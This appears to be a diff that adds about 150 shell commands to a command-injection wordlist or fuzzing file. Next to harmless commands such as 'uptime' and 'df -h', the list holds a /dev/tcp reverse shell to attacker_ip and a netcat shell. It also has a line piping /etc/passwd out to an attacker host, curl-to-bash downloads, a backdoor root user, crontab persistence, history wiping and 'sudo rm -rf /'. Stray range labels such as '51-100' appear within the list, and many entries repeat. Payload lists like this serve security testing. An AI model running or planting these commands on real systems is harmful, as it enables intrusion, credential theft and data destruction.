@@ -9,6 +9,150 @@ command=dir
 executedir
 ping=dir
 query=dir
+ping 127.0.0.1
+ls
+echo $HOME
+ifconfig
+rm -rf /path/to/file
+ps aux
+id
+cat /etc/passwd
+uptime
+whoami
+pwd
+top
+date
+df -h
+du -sh /path/to/dir
+find / -name "file.txt"
+wget http://example.com/shell.sh
+curl http://example.com/shell.sh
+curl -O http://example.com/file
+touch /tmp/evil.sh
+chmod +x /tmp/evil.sh
+sh /tmp/evil.sh
+bash -i
+echo "export PATH=/tmp:$PATH"
+sudo rm -rf /
+echo $USER
+echo $PATH
+ls -al /home/user
+ls -al /etc
+mkdir /tmp/evil
+echo "some malicious code" > /tmp/evil
+rmdir /tmp/evil
+cp /etc/passwd /tmp/
+scp user@victim:/path/to/file /tmp/
+tar -xvf malicious.tar
+gzip -d malicious.gz
+bzip2 -d malicious.bz2
+nc -lvp 4444
+nc victim_ip 4444 -e /bin/bash
+nc -zv 127.0.0.1 1-65535
+traceroute 127.0.0.1
+telnet 127.0.0.1
+ftp 127.0.0.1
+ssh user@host
+echo "root:x:0:0:root:/root:/bin/bash" >> /etc/passwd
+echo "root:root" | chpasswd
+sudo su -
+sudo -u root /bin/bash
+chmod 777 /path/to/dir
+ln -s /etc/passwd /tmp/passwd_symlink
+51-100
+nc -w 3 -v victim_ip 80
+curl -X POST http://victim_ip/endpoint -d "cmd=ls"
+wget -O /dev/null http://victim_ip/evil.sh
+echo "HTTP/1.1 200 OK\nLocation: /path/to/malicious" > /tmp/shell
+export HISTFILE=/dev/null
+export PS1='; ls -al'
+export PATH=/tmp:$PATH
+echo "some malicious command" > /tmp/evil.sh
+echo "ping -c 4 127.0.0.1" >> /tmp/evil.sh
+echo "ls /tmp" | at now
+echo "wget http://attacker_ip/evil.sh" > /tmp/evil.sh
+echo "curl -O http://attacker_ip/evil.sh" > /tmp/evil.sh
+export TERM=linux; clear
+cat /etc/passwd | curl -X POST -d @- http://attacker_ip/collect
+echo "curl http://attacker_ip/shell.sh | bash" > /tmp/evil.sh
+echo "echo 'hacked' > /tmp/hacked.txt"
+echo "rm -rf /tmp/*" > /tmp/evil.sh
+echo "cp /etc/passwd /tmp/passwd" > /tmp/evil.sh
+echo "rm -rf /path/to/important/file" > /tmp/evil.sh
+export SHELL=/bin/bash
+whois victim_ip
+netstat -an
+hostname
+uname -a
+dmesg | grep -i "error"
+lsof -i
+echo "wget http://attacker_ip/malicious_file" > /tmp/evil.sh
+sudo shutdown -h now
+chmod 755 /tmp/evil.sh
+service apache2 restart
+service nginx restart
+service ssh restart
+telnet -l root victim_ip
+echo "0 0 * * * root /path/to/script.sh" >> /etc/crontab
+echo "*/5 * * * * root /path/to/script.sh" >> /etc/crontab
+crontab -l
+crontab -e
+apt-get update && apt-get upgrade
+apt-get install curl
+apt-get install nmap
+curl -X GET "http://victim_ip/endpoint?cmd=ls"
+curl -X POST -d "cmd=ls -al" http://victim_ip/endpoint
+echo "curl http://attacker_ip/shell.sh" > /tmp/evil.sh
+echo "wget http://attacker_ip/shell.sh" > /tmp/evil.sh
+sudo useradd -ou 0 -g 0 root
+echo "root:root" | chpasswd
+echo "echo root:root | chpasswd" > /tmp/evil.sh
+echo "echo hacked > /tmp/hacked.txt" > /tmp/evil.sh
+ls -al /var/www/
+ping -c 4 victim_ip
+101-150
+ls -al /home/user
+cat /var/log/auth.log
+curl -s http://victim_ip/evil_script.sh | bash
+wget http://victim_ip/evil_script.sh
+ssh victim_ip
+sudo su
+bash -i >& /dev/tcp/attacker_ip/4444 0>&1
+echo "ssh user@victim_ip" | at now
+sudo ls /home/user
+echo "wget http://attacker_ip/evil.sh -O /tmp/evil.sh" > /tmp/run.sh
+chmod +x /tmp/run.sh
+/bin/bash -i
+/bin/sh -i
+sudo service apache2 start
+ls /var/www/html
+echo "ping 127.0.0.1" > /tmp/evil.sh
+echo "sh /tmp/evil.sh" > /tmp/evil.sh
+chmod 777 /tmp/evil.sh
+echo "mkdir /tmp/evil" > /tmp/evil.sh
+echo "curl http://attacker_ip/evil.sh -O /tmp/evil.sh" > /tmp/run.sh
+echo "rm -rf /tmp/evil" > /tmp/evil.sh
+echo "ps aux | grep apache" > /tmp/run.sh
+echo "ping -c 4 victim_ip" > /tmp/evil.sh
+echo "wget http://attacker_ip/evil.sh" > /tmp/evil.sh
+echo "curl -O http://attacker_ip/shell.sh" > /tmp/evil.sh
+echo "echo 'hacked' > /tmp/hacked.txt" > /tmp/evil.sh
+echo "echo 'malicious_command' > /tmp/malicious.txt" > /tmp/evil.sh
+echo "chmod 777 /tmp/malicious_file" > /tmp/evil.sh
+echo "ln -s /etc/passwd /tmp/passwd_symlink" > /tmp/evil.sh
+echo "rm -rf /tmp/*" > /tmp/evil.sh
+echo "ls /tmp" > /tmp/evil.sh
+echo "tar -xvf malicious.tar" > /tmp/evil.sh
+echo "nc -v 127.0.0.1 4444" > /tmp/evil.sh
+echo "nmap -sP 192.168.1.0/24" > /tmp/evil.sh
+echo "netcat -lvp 4444" > /tmp/evil.sh
+echo "cat /etc/shadow" > /tmp/evil.sh
+echo "cat /etc/passwd" > /tmp/evil.sh
+echo "ps aux | grep apache" > /tmp/evil.sh
+echo "killall apache2" > /tmp/evil.sh
+echo "shutdown -h now" > /tmp/evil.sh
+echo "service apache2 restart" > /tmp/evil.sh
+echo "ps aux" > /tmp/evil.sh
 jump=dir
 code=dir
 reg=dir
